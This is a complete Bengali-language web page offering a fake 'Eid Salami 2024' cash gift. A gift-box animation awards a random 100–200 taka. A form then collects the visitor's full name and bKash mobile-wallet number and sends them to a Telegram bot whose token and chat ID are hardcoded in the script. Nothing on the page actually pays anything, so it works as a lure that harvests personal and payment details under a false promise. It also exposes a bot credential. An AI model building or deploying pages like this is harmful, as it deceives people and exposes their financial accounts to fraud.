<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Let Gift 🎁🎈</title>
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;500;700&display=swap" rel="stylesheet">
    <!-- Canvas Confetti Library -->
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    
    <style>
        :root {
            --primary: #064e3b;
            --secondary: #fbbf24;
            --white: #ffffff;
            --error: #ef4444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Hind Siliguri', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #064e3b 0%, #065f46 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--white);
            overflow-x: hidden;
        }

        .card {
            width: 90%;
            max-width: 420px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            padding: 30px 20px;
            border-radius: 25px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
        }

        h1 { color: var(--secondary); font-size: 2rem; margin-bottom: 10px; }
        p { opacity: 0.9; margin-bottom: 20px; }

        /* Gift Animation Section */
        .gift-box {
            width: 120px;
            margin: 20px auto;
            cursor: pointer;
            transition: 0.3s;
        }
        .gift-box.disabled {
            cursor: default;
            opacity: 0.7;
            transform: scale(0.9);
        }
        .gift-box:not(.disabled):hover { transform: scale(1.1); }

        /* Form Styling */
        .input-group {
            margin-top: 20px;
            display: none;
            text-align: left;
            animation: slideUp 0.5s ease;
        }

        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        label { display: block; margin-bottom: 5px; font-size: 0.9rem; color: var(--secondary); }
        
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border-radius: 10px;
            border: 1px solid rgba(255,255,255,0.3);
            background: rgba(255,255,255,0.1);
            color: white;
            outline: none;
        }

        input::placeholder { color: rgba(255,255,255,0.5); }

        .btn {
            background: var(--secondary);
            color: #000;
            border: none;
            padding: 12px 25px;
            width: 100%;
            border-radius: 10px;
            font-weight: 700;
            font-size: 1.1rem;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn:disabled { background: #6b7280; cursor: not-allowed; }

        /* Reward Display */
        #rewardDisplay {
            display: none;
            font-size: 3rem;
            font-weight: 800;
            color: var(--secondary);
            margin: 20px 0;
            animation: pop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes pop {
            0% { transform: scale(0); }
            100% { transform: scale(1); }
        }

        .loader {
            display: none;
            width: 30px;
            height: 30px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--secondary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .success-msg { color: #4ade80; display: none; margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="card">
        <div id="step-1">
            <h1>ঈদ সালামি ২০২৪ 🌙</h1>
            <p id="instructionText">নিচের গিফট বক্সটিতে ক্লিক করে আপনার ভাগ্য পরীক্ষা করুন!</p>
            <div class="gift-box" id="giftBox" onclick="startSpin()">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20 12V22H4V12" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M22 7H2V12H22V7Z" fill="#fbbf24"/>
                    <path d="M12 22V7" stroke="#064e3b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M12 7H16.5C16.5 7 16.5 3 12 3C7.5 3 7.5 7 7.5 7H12Z" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
        </div>

        <div id="rewardDisplay">৳<span id="amount">0</span></div>

        <div id="formSection" class="input-group">
            <label>আপনার নাম:</label>
            <input type="text" id="userName" placeholder="আপনার পুরো নাম লিখুন">
            
            <label>বিকাশ নম্বর:</label>
            <input type="number" id="userPhone" placeholder="017XXXXXXXX">
            
            <p style="font-size: 0.8rem; margin-bottom: 10px; color: #fca5a5;">
                * নিশ্চিত করুন এটিই আপনার সঠিক বিকাশ নম্বর।
            </p>
            
            <button id="submitBtn" class="btn" onclick="sendToTelegram()">সালামি কনফার্ম করুন ✅</button>
            <div id="loader" class="loader"></div>
            <p id="successMsg" class="success-msg">অভিনন্দন! আপনার তথ্য সফলভাবে পাঠানো হয়েছে।</p>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8998875786:AAGWk6PKD5-sWiJSV1kABSSR2lklEKpdOSQ';
        const CHAT_ID = '7646696853';

        let wonAmount = 0;
        let isSpinning = false;

        // চেক করা হচ্ছে আগে সাবমিট করেছে বা স্পিন করেছে কি না
        window.onload = () => {
            const hasSubmitted = localStorage.getItem('salami_submitted');
            const savedAmount = localStorage.getItem('salami_won_amount');

            if (hasSubmitted) {
                document.getElementById('step-1').innerHTML = "<h1>দুঃখিত! ❌</h1><p>আপনি ইতিমধ্যে আপনার সালামি গ্রহণ করেছেন।</p>";
                return;
            }

            if (savedAmount) {
                wonAmount = parseInt(savedAmount);
                showRewardUI(wonAmount);
            }
        };

        function startSpin() {
            if (isSpinning || localStorage.getItem('salami_won_amount')) return;

            isSpinning = true;
            const giftBox = document.getElementById('giftBox');
            giftBox.classList.add('disabled'); // বক্স ক্লিক ডিজেবল করা

            // র‍্যান্ডম টাকা ১০০ - ২০০
            wonAmount = Math.floor(Math.random() * (200 - 100 + 1)) + 100;
            
            // টাকাটি লোকাল স্টোরেজে সেভ করে রাখা যাতে রিফ্রেশ দিলেও চেঞ্জ না হয়
            localStorage.setItem('salami_won_amount', wonAmount);

            showRewardUI(wonAmount);
        }

        function showRewardUI(amount) {
            const step1 = document.getElementById('step-1');
            const rewardDisplay = document.getElementById('rewardDisplay');
            const amountSpan = document.getElementById('amount');
            const formSection = document.getElementById('formSection');

            step1.style.display = 'none';
            rewardDisplay.style.display = 'block';
            
            // কাউন্টার অ্যানিমেশন
            let count = 0;
            let speed = 30;
            let timer = setInterval(() => {
                count += 5;
                if(count >= amount) {
                    amountSpan.innerText = amount;
                    clearInterval(timer);
                    triggerConfetti();
                    formSection.style.display = 'block';
                } else {
                    amountSpan.innerText = count;
                }
            }, speed);
        }

        async function sendToTelegram() {
            const name = document.getElementById('userName').value.trim();
            const phone = document.getElementById('userPhone').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            const loader = document.getElementById('loader');
            const successMsg = document.getElementById('successMsg');

            if (!name || !phone) {
                alert("দয়া করে নাম এবং বিকাশ নম্বর সঠিকভাবে দিন!");
                return;
            }

            if (phone.length < 11) {
                alert("সঠিক বিকাশ নম্বর দিন (কমপক্ষে ১১ ডিজিট)");
                return;
            }

            submitBtn.style.display = 'none';
            loader.style.display = 'block';

            const message = `
🌟 **নতুন ঈদ সালামি ক্লেইম!** 🌟
━━━━━━━━━━━━━━━━━━
👤 নাম: ${name}
💰 টাকার পরিমাণ: ${wonAmount} TK
📱 বিকাশ নম্বর: ${phone}
━━━━━━━━━━━━━━━━━━
            `;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    localStorage.setItem('salami_submitted', 'true');
                    loader.style.display = 'none';
                    successMsg.style.display = 'block';
                    alert("আপনার সালামি রিকোয়েস্ট পাঠানো হয়েছে!");
                } else {
                    throw new Error();
                }
            } catch (error) {
                alert("সমস্যা হয়েছে! আবার চেষ্টা করুন।");
                submitBtn.style.display = 'block';
                loader.style.display = 'none';
            }
        }

        function triggerConfetti() {
            confetti({
                particleCount: 150,
                spread: 70,
                origin: { y: 0.6 },
                colors: ['#fbbf24', '#ffffff', '#064e3b']
            });
        }
    </script>
</body>
</html>
